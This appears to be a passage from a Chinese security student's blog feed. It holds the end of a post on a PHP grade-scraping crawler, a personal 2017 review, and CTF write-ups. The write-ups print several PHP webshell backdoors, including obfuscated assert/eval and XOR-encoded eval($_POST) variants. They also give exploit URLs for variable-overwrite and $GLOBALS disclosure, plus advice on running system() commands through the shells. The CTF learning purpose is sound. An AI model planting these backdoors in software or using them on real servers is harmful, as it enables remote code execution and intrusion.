class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$url2=&quot;http://localhost/xscjcx.aspx?xh=&quot;.$_SESSION[&apos;xh&apos;];</span><br><span class="line">$viewstate=login_post($url2,&apos;&apos;);</span><br><span class="line">preg_match_all(&apos;/&lt;input type=&quot;hidden&quot; name=&quot;__VIEWSTATE&quot; value=&quot;([^&lt;&gt;]+)&quot; \/&gt;/&apos;, $viewstate, $vs);</span><br><span class="line">$state=$vs[1][0];  //$state存放一会post的__VIEWSTATE</span><br></pre></td></tr></table></figure><p>获取到所有参数，提交post数据报就可以返回值了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$post=array(</span><br><span class="line"> &apos;__EVENTTARGET&apos;=&gt;&apos;&apos;,</span><br><span class="line"> &apos;__EVENTARGUMENT&apos;=&gt;&apos;&apos;,</span><br><span class="line"> &apos;__VIEWSTATE&apos;=&gt;$state,</span><br><span class="line"> &apos;hidLanguage&apos;=&gt;&apos;&apos;,</span><br><span class="line">   &apos;ddlXN&apos;=&gt;$current_year,  //当前学年</span><br><span class="line">   &apos;ddlXQ&apos;=&gt;$current_term,  //当前学期</span><br><span class="line">   &apos;ddl_kcxz&apos;=&gt;&apos;&apos;,</span><br><span class="line">   &apos;btn_xq&apos;=&gt;&apos;%D1%A7%C6%DA%B3%C9%BC%A8&apos;  //“学期成绩”的gbk编码，视情况而定</span><br><span class="line">   );</span><br><span class="line">$content=login_post($url2,$cookie,http_build_query($post)); //获取原始数据</span><br></pre></td></tr></table></figure><p>这里就得到要查询的学期的成绩了，得到的HTML里的table标签的数据，需要转换为数组进行输出。</p><p>用到一个函数get_td_array()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function get_td_array($table) &#123;</span><br><span class="line">    $table = preg_replace(&quot;&apos;&lt;table[^&gt;]*?&gt;&apos;si&quot;,&quot;&quot;,$table);</span><br><span class="line">    $table = preg_replace(&quot;&apos;&lt;tr[^&gt;]*?&gt;&apos;si&quot;,&quot;&quot;,$table);</span><br><span class="line">    $table = preg_replace(&quot;&apos;&lt;td[^&gt;]*?&gt;&apos;si&quot;,&quot;&quot;,$table);</span><br><span class="line">    $table = str_replace(&quot;&lt;/tr&gt;&quot;,&quot;&#123;tr&#125;&quot;,$table);</span><br><span class="line">    $table = str_replace(&quot;&lt;/td&gt;&quot;,&quot;&#123;td&#125;&quot;,$table);</span><br><span class="line">        //去掉 HTML 标记</span><br><span class="line">    $table = preg_replace(&quot;&apos;&lt;[/!]*?[^&lt;&gt;]*?&gt;&apos;si&quot;,&quot;&quot;,$table);</span><br><span class="line">        //去掉空白字符</span><br><span class="line">    $table = preg_replace(&quot;&apos;([rn])[s]+&apos;&quot;,&quot;&quot;,$table);</span><br><span class="line">    $table = preg_replace(&apos;/&amp;nbsp;/&apos;,&quot;&quot;,$table);</span><br><span class="line">    $table = str_replace(&quot; &quot;,&quot;&quot;,$table);</span><br><span class="line">    $table = str_replace(&quot; &quot;,&quot;&quot;,$table);</span><br><span class="line">    $table = explode(&apos;&#123;tr&#125;&apos;, $table);</span><br><span class="line">    array_pop($table);</span><br><span class="line">    foreach ($table as $key=&gt;$tr) &#123;</span><br><span class="line">        $td = explode(&apos;&#123;td&#125;&apos;, $tr);</span><br><span class="line">        array_pop($td);</span><br><span class="line">        $td_array[] = $td;</span><br><span class="line">    &#125;</span><br><span class="line">    return $td_array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从该函数的代码来看，可以看出是利用正则匹配table标签下的tr,td将数据通过遍历存入数组返回。</p><p>到这里当前学期的成绩详情都可以获取到了。</p><p>下面是绩点的计算，我们学校的系统是把已修学科的学分绩点都列出来了的。我们只需要把数据爬取出来做一个简单的计算就行了。</p><p>数据报跟查询学期成绩是差不多的。简单的看下post数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$post_allgrade=array(</span><br><span class="line"> &apos;__EVENTTARGET&apos;=&gt;&apos;&apos;,</span><br><span class="line"> &apos;__EVENTARGUMENT&apos;=&gt;&apos;&apos;,</span><br><span class="line"> &apos;__VIEWSTATE&apos;=&gt;$state,</span><br><span class="line"> &apos;hidLanguage&apos;=&gt;&apos;&apos;,</span><br><span class="line">   &apos;ddlXN&apos;=&gt;$current_year,  //当前学年</span><br><span class="line">   &apos;ddlXQ&apos;=&gt;$current_term,  //当前学期</span><br><span class="line">   &apos;ddl_kcxz&apos;=&gt;&apos;&apos;,</span><br><span class="line">   &apos;btn_zcj&apos;=&gt;&apos;%C0%FA%C4%EA%B3%C9%BC%A8&apos;  //历年成绩-gbk</span><br><span class="line">   );</span><br><span class="line">$content_allgrade=login_post($url2,$cookie,http_build_query($post_allgrade)); //获取原始数据</span><br><span class="line">$content_allgrade=get_td_array($content_allgrade);    //table转array</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//计算总的加权分数和总的GPA</span><br><span class="line">$i = 5;         //从array[5]开始是有效信息</span><br><span class="line">$all_value = 0; //总的学分权值</span><br><span class="line">$all_GPA = 0;   //总的GPA*分数</span><br><span class="line">$all_number_of_lesson_with_public = 0;</span><br><span class="line">$all_score_of_lesson_with_public = 0;</span><br><span class="line">//计算总和的东西，学分/GPA</span><br><span class="line">while(isset($content_allgrade[$i][4]))&#123;</span><br><span class="line">if ($content_allgrade[$i][5] == iconv(&quot;utf-8&quot;,&quot;gb2312//IGNORE&quot;,&quot;公选&quot;))&#123;</span><br><span class="line">//计算公选课课程数和总学分</span><br><span class="line">$all_number_of_lesson_with_public ++;</span><br><span class="line">$all_score_of_lesson_with_public += $content_allgrade[$i][6];</span><br><span class="line">$i++;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$all_value += $content_allgrade[$i][6];//已修总学分</span><br><span class="line">$all_GPA += ($content_allgrade[$i][6] * $content_allgrade[$i][7]); </span><br><span class="line">$i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面是一个简单的计算GPA的过程，简单来说就是一个遍历叠加计算的过程。</p><p>到这里require_grade页面的PHP部分差不多都说完了，后面的数据的排版输出了。</p><h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><p><a href="https://github.com/uknowsec/GPACrawler" target="_blank" rel="noopener">https://github.com/uknowsec/GPACrawler</a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/wangyufeng0615/bjuthelper" target="_blank" rel="noopener">https://github.com/wangyufeng0615/bjuthelper</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;从去年寒假开始，学校的一些二级域名就对外网访问进行了限制。而在校内同学们宿舍普遍是用的电信网，要使用内网需要到教学区域连学校的wifi才行。
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Summary of 2017</title>
    <link href="https://uknowsec.cn/posts/life/Summary-of-2017.html"/>
    <id>https://uknowsec.cn/posts/life/Summary-of-2017.html</id>
    <published>2018-01-21T15:29:10.000Z</published>
    <updated>2018-03-10T10:01:45.698Z</updated>
    
    <content type="html"><![CDATA[<h1 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h1><p>2017年我从大二进入大三，算是在南京过了第一个大学暑假。我对暑假的实习生活有很多感慨，同时对我大三上学期这一年的感慨也挺多的。可能是因为大二下学期太久远了，以至于我都忘记我大二下学期都干了些什么了，记得实习那段时间过得挺辛苦的，每天挤着南京的早班地铁去公司。</p><p>我第一感受到了自己的成长，就跟电视剧里看的那样穿着简单T恤，背着背包，挤着地铁。这种感觉很奇妙，就好像我第一次走进大学的校园那种感觉。那段时间习惯了早上拿上一瓶牛奶，口里咬着小面包，骑着小黄车去上班。下午在义乌的小摊小贩上打上一份普通的晚饭，同样是骑着小黄车汗流浃背的回到宿舍。</p><p>暑假的后一个月，学校宿舍基本都是没人的，于是把音乐开外放到最大，放一曲民谣，洗完澡坐在椅子上刷刷手机。大学这几年爱上了民谣，一直都在听，手机里放的都是不知民的小歌手的民谣歌曲。因为我喜欢他们的小众，喜欢他们所叙说的简单故事，直截了当，简单明了。</p><p>大三上学期也是匆匆忙忙，结束实习后立下flag，好像也没有完成什么。期间断断续续地赚了几个钱，加上实习的少许工资，得以过活这一个学期的生活。同时也做了一个很意外的决定。但是失败了，之后还感觉有一点点小小的难堪。不过，自己也在这次中学到了很多，成长了很多。并不觉得是一次错误的决定，可能是因为我个人的原因所导致的。</p><h1 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h1><p>大三整个学期的学校课程可能就归结于最后的一个月吧，其实一个学期下来也没听什么，都是最后一个月快考试了突击一下。庆幸的是，刚刚查了查成绩也基本上过了。同时要提下我的英语四级了，经过四次考试，最终以425分一分不多一份不少过了，之前还担心过自己因为这个拿不到毕业证过。</p><p>大二立了一个科创项目，今年也结束了。答辩很水，主要还是了解了整个项目开发流程，也从中学到了android和web的交互方面的知识。结束后，在老师的要求下还申请了一个实用新型的专利认证。我对于这些什么证书好像看得不是很重要，但老师一再要求，所以写了一份申请书给他。</p><p>博客从2016年搭建起来到现在也差不多一年多了，自己很看重这个。一直写点东西往上面传，可能没有什么干货，都是一些简单的记录和学习笔记。暑假在实习公司是我博客更新最频繁的一段时间，因为我一直在学WEB安全方面的东西，每每学习一方面的知识我都用博客记录下来，这段时间也是我博客访问量最多的时间。</p><p>结束实习后，实习公司的前辈们开始每个星期在群里出几个CTF的题目，我也陆陆续续的跟着做，这些题目不难，但涉及面很广，都是一些基础的东西，很有益于我现在的状态，一个基础并不是那么扎实的新人，自己记录每一个题目的解题思路，理解整个过程。不会便请教前辈。</p><p>这一年来也在不断加强自己的编程能力，可能效果并不是那么明显。也就是跟着视频里的项目实战，一边看一边写。期间学习了ThinkPHP框架，同时写写PHP和Python。这使我在做CTF题目时更容易去理解代码。以致于做题时不是那么懵逼，加快做题的速度。</p><h1 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h1><p>这几天估摸着换一台新的机器，现在这台机器也是大一大二陪我一直熬到宿舍断电，电池空血过的。换机器也是挺不容易的一件事，一是经济，二是这台老机器上有太多的东西需要后面转移和处理了，所以我想我会很珍惜新机器。</p><p>过完年去也就大三下了，我感觉这两年来在南京上学过得挺无趣的，没有多出去走走，整天呆在学校不知道在捣鼓什么，计划着找个时间，找个伴出去走走。伴这种事也不能强求，记得当时我自己说的好，现在的自己还没有任何能力，靠着父母的钱过活。所以等我能靠自己过活再说伴的事吧。</p><p>一直挺喜欢民谣的，自己也在南京。南京民谣莫过于李志。其实今年元旦挺想去看李志的演唱会的，但是后来还是不了了之。明年有机会，带上那个还是未知的伴去看一场李志的演唱会，就买最便宜的票。然后去街头找寻李志歌里所唱的南京。</p><p>2018年暑假前，还是要多多学习技术方面的东西。编程、渗透、CTF等一些基础的知识，该学，该跟上的还是要一个一个脚踏实地的跟上学习，为大三下学期暑假实习做好充分的准备。希望自己能找到一个不错的实习，在实习中学到一些知识来提高自己。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;生活&quot;&gt;&lt;a href=&quot;#生活&quot; class=&quot;headerlink&quot; title=&quot;生活&quot;&gt;&lt;/a&gt;生活&lt;/h1&gt;&lt;p&gt;2017年我从大二进入大三，算是在南京过了第一个大学暑假。我对暑假的实习生活有很多感慨，同时对我大三上学期这一年的感慨也挺多的。可能是因为大
      
    
    </summary>
    
      <category term="life" scheme="https://uknowsec.cn/categories/life/"/>
    
    
  </entry>
  
  <entry>
    <title>week 9 for cnas writeup</title>
    <link href="https://uknowsec.cn/posts/ctf/week-9-for-cnas-writeup.html"/>
    <id>https://uknowsec.cn/posts/ctf/week-9-for-cnas-writeup.html</id>
    <published>2018-01-16T13:38:18.000Z</published>
    <updated>2018-05-03T10:01:20.565Z</updated>
    
    <content type="html"><![CDATA[<h2 id="01-50"><a href="#01-50" class="headerlink" title="01 50"></a>01 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="noopener">http://47.100.121.220:28001/01.php</a></p><h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">highlight_file(&apos;about.php&apos;); </span><br><span class="line">?&gt; &lt;?php </span><br><span class="line">$e = $_REQUEST[&apos;a&apos;]; </span><br><span class="line">$arr = array($_POST[&apos;b&apos;] =&gt; &apos;|.*|e&apos;,); </span><br><span class="line">array_walk($arr, $e, &apos;&apos;);</span><br></pre></td></tr></table></figure><p>如上代码，是一个PHP木马。是可以用菜刀连接的。</p><p>这里用到array_walk函数</p><p>array_walk() 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_walk(array,myfunction,userdata...)</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td>array</td><td style="text-align:center">必需。规定数组。</td></tr><tr><td>myfunction</td><td style="text-align:center">必需。用户自定义函数的名称。</td></tr><tr><td>userdata,…</td><td style="text-align:center">可选。规定用户自定义函数的参数。您能够向此函数传递任意多参数。</td></tr></tbody></table><p>网上给的是用assert函数，但是这里用assert不行。然后在学长的提醒下，这里提到|e，</p><p>所以可以用preg_replace函数.</p><p>如下图构造菜刀连接</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/09_1.png" alt=""></p><p>或者直接hackbar</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/09_2.png" alt=""></p><h2 id="02-100"><a href="#02-100" class="headerlink" title="02 100"></a>02 100</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002/index.php" target="_blank" rel="noopener">http://47.100.121.220:28002/index.php</a></p><h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">echo &quot;&lt;/br&gt;&quot;; </span><br><span class="line">highlight_file(&apos;about.php&apos;); </span><br><span class="line">echo &quot;&lt;/br&gt;&quot;; </span><br><span class="line">highlight_file(&apos;echo.php&apos;); </span><br><span class="line">?&gt; </span><br><span class="line">&lt;?php </span><br><span class="line">ob_start(&apos;assert&apos;); </span><br><span class="line">echo $_REQUEST[&apos;pass&apos;]; </span><br><span class="line">ob_end_flush(); </span><br><span class="line">//关键缓存每5分钟清理一次。&lt;/br&gt; </span><br><span class="line">&lt;?php </span><br><span class="line">include &quot;func.php&quot;; </span><br><span class="line"></span><br><span class="line">$your_real_ip = real_ip(); </span><br><span class="line">$path = &quot;temp/&quot;.$your_real_ip.&quot;_http_request_history.txt&quot;; </span><br><span class="line"></span><br><span class="line">$url = &apos;http://&apos;.$_SERVER[&apos;HTTP_HOST&apos;].$_SERVER[&apos;REQUEST_URI&apos;]; </span><br><span class="line">echo $your_real_ip.&quot;&lt;/br&gt;&quot;; </span><br><span class="line">echo $url; </span><br><span class="line"></span><br><span class="line">$fout = null; </span><br><span class="line">if(file_exists($path)) &#123; </span><br><span class="line">    $fout = fopen($path, &quot;ab&quot;) or die(&quot;Unable to open file!&quot;); </span><br><span class="line">&#125; </span><br><span class="line">else &#123; </span><br><span class="line">    $fout = fopen($path, &quot;wb&quot;) or die(&quot;Unable to open file!&quot;); </span><br><span class="line">&#125; </span><br><span class="line">fwrite($fout, $url.&quot;\n&quot;); </span><br><span class="line">fclose($fout); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里也提到了一种PHP木马的写法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ob_start(&apos;assert&apos;); </span><br><span class="line">echo $_REQUEST[&apos;pass&apos;]; </span><br><span class="line">ob_end_flush();</span><br></pre></td></tr></table></figure><p>ob_start(“assert”)的意思设置assert作为ob操作结束时回调函数，</p><p>这个PHP木马是没有回显的</p><p>但是在给出的echo.php的代码有给出一些提示</p><p>这里说到的是temp文件夹是有写的权限的。</p><p>所以如下执行</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/09_3.png" alt=""></p><p><img src="http://obr4sfdq7.bkt.clouddn.com/09_4.png" alt=""></p><h3 id="login-100"><a href="#login-100" class="headerlink" title="login 100"></a>login 100</h3><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003/" target="_blank" rel="noopener">http://47.100.121.220:28003/</a></p><h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>这个题目注册完账号登录后会提示你</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">您已登录成功，但只有nari用户才可以看到flag.</span><br></pre></td></tr></table></figure><p>这里根本没有任何思路的，然后学长告诉我。</p><p>注册nari后加个空格就可以了，我一脸懵逼。他也不知道为什么？</p><p>所以我注册nari加两个空格进去了，拿到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a3afa127cfb57f423c7bc019587031020a2ce630&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;01-50&quot;&gt;&lt;a href=&quot;#01-50&quot; class=&quot;headerlink&quot; title=&quot;01 50&quot;&gt;&lt;/a&gt;01 50&lt;/h2&gt;&lt;h3 id=&quot;题目链接&quot;&gt;&lt;a href=&quot;#题目链接&quot; class=&quot;headerlink&quot; title=&quot;题目链接&quot;
      
    
    </summary>
    
      <category term="CTF" scheme="https://uknowsec.cn/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>month 2 for cnas writeup</title>
    <link href="https://uknowsec.cn/posts/ctf/month-2-for-cnas-writeup.html"/>
    <id>https://uknowsec.cn/posts/ctf/month-2-for-cnas-writeup.html</id>
    <published>2018-01-06T14:29:49.000Z</published>
    <updated>2018-05-03T10:01:20.479Z</updated>
    
    <content type="html"><![CDATA[<h2 id="01-50"><a href="#01-50" class="headerlink" title="01 50"></a>01 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="noopener">http://47.100.121.220:28001/01.php</a></p><h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>题目又是大写又是小写的，格式乱乱的，强迫症患了。</p><p>整理下代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">show_source(__file__); </span><br><span class="line">highlight_file(&apos;about.php&apos;); </span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php $k=str_replace(&apos;`&apos;,&apos;&apos;,&apos;a`s`s`e`r`t&apos;);</span><br><span class="line">$m=$_POST[m];</span><br><span class="line">if($m==null)</span><br><span class="line">header(&apos;status:404&apos;);</span><br><span class="line">else/**/</span><br><span class="line">$k($m);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里的highlight_file在这里的作用就是读取文件代码的，下面是about.php的源码</p><p>看about的源码这里可以看出m的值为assert</p><p>最后的就相当于执行\$assert(\$m)，assert()执行代码。</p><p>传入system()函数来读取文件即可。</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/m2_1.png" alt=""></p><h2 id="02-50"><a href="#02-50" class="headerlink" title="02 50"></a>02 50</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002/02.php" target="_blank" rel="noopener">http://47.100.121.220:28002/02.php</a></p><h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">highlight_file(&apos;about.php&apos;); </span><br><span class="line">?&gt; &lt;?php </span><br><span class="line">$YT=&quot;\x61\x73\x73\x65\x72\x74&quot;; </span><br><span class="line">$TH=&quot;\x80\xD3\xCB\x85\x9E\xB4\xB7\xCF\xD8\xBB\xCB\xCC\xD8\xE7\xA3\xD9\xC2\xBE\xAC&quot;; </span><br><span class="line">$TU=&quot;\xE5\xA5\xAA\xE9\xB6\x90\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\x97&quot;; </span><br><span class="line">@$YT($TH^$TU); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个题目也有highlight_file函数也是用来读about的源码</p><p>这里我们可以直接测试输出这三个变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$YT=&quot;\x61\x73\x73\x65\x72\x74&quot;; </span><br><span class="line">$TH=&quot;\x80\xD3\xCB\x85\x9E\xB4\xB7\xCF\xD8\xBB\xCB\xCC\xD8\xE7\xA3\xD9\xC2\xBE\xAC&quot;; </span><br><span class="line">$TU=&quot;\xE5\xA5\xAA\xE9\xB6\x90\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\x97&quot;; </span><br><span class="line">echo $YT;</span><br><span class="line">echo $TH^$TU; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码运行得到</p><p>\$YT=assert </p><p>\$TH^\$TUeval($_POST[0x41]);</p><p>0x41是十六进制数，表示的字符是大写字符A，A的ASCII码为65</p><p>这里我用A传参是穿不进去的，用0x41也不行。但是用65可以成功传参</p><p>同样传入system函数执行命令</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/m2_2.png" alt=""></p><h2 id="gift-100"><a href="#gift-100" class="headerlink" title="gift 100"></a>gift 100</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003/" target="_blank" rel="noopener">http://47.100.121.220:28003/</a></p><h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>右键查看源码可以发现备份文件gift.php.bak</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag=&apos;xxx&apos;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($gift))</span><br><span class="line">&#123;</span><br><span class="line">$content=trim(file_get_contents($flag));</span><br><span class="line">if($gift==$content)</span><br><span class="line">&#123;</span><br><span class="line">echo&apos;flag&#123;...&#125;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo&apos;Oh..&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码如上，这里考到一个变量覆盖的问题。</p><p>题目使用了extract(\$_GET)接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用extract()对变量进行覆盖，从而满足各个条件。</p><p>GET请求 ?flag=\&amp;gift=，extract()会将\$flag和\$gift的值覆盖了，将变量的值设置为空或者不存在的文件就满足\$gift == \$content。</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28003/gift.php?flag=&amp;gift=</span><br></pre></td></tr></table></figure><h2 id="variable-100"><a href="#variable-100" class="headerlink" title="variable 100"></a>variable 100</h2><h3 id="题目链接-3"><a href="#题目链接-3" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28004" target="_blank" rel="noopener">http://47.100.121.220:28004</a></p><h3 id="解答-3"><a href="#解答-3" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">$s = &quot;You can not get the flag!&lt;/br&gt;&quot;;</span><br><span class="line">echo $s;</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;a&apos;])) &#123;</span><br><span class="line">    $args = $_GET[&apos;a&apos;];</span><br><span class="line">    if(!preg_match(&quot;/^\w+$/&quot;,$args)) &#123;</span><br><span class="line">        die(&quot;error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&quot;var_dump($$args);&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看代码可以看出我们需要去读flag.php里的变量flag，</p><p>这里变量可以用\$\$这种方式来传入我们的变量a通过var_dump函数来读取</p><p>传入flag是行不通的，flag.php中的存有flag的变量名并不是flag。</p><p>但是我们可以传入GLOBALS</p><p>\$GLOBALS是PHP中的全局变量，用来储存全局作用域中的变量</p><p>所以payload如下，得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28004/04.php?a=GLOBALS</span><br></pre></td></tr></table></figure><h2 id="price-100"><a href="#price-100" class="headerlink" title="price 100"></a>price 100</h2><h3 id="题目链接-4"><a href="#题目链接-4" class="headerlink" title="题目链接"></a>题目链接</h3><p><a 